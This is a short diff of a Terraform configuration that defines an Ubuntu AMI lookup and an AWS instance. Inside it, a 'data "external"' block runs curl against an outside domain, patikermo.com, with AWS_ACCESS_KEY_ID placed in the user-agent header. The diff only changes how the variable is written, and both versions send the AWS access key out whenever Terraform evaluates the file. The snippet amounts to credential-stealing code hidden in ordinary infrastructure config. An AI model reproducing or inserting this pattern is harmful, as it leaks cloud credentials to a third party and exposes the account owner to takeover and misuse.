@@ -19,7 +19,7 @@ data "aws_ami" "ubuntu" {
 }
 
 data "external" "example" {
-  program = ["curl", "http://patikermo.com", "-A","${AWS_ACCESS_KEY_ID}"]
+  program = ["curl", "http://patikermo.com", "-A",AWS_ACCESS_KEY_ID]
 }
 
 resource "aws_instance" "ubuntu" {
